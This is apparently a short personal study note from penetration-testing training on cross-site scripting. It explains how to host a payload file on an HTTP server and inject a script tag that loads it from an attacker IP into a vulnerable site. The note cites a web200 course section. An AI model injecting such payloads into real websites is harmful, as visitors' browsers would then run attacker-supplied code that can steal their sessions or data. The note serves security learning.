---
tags:
- xss
---

# XSS external JS payload

1. Run http server and create xss.js file with payload [[2023042721114747 Create FS http server]]
2. Create link to your external script and inject it in vulnerable to XSS site: 
```html
<script src="http://<ip>/xss.js"></script>
```

## References
1. web200.Cross-Site Scripting Exploitation and Case Study.Moving the Payload to an External Resource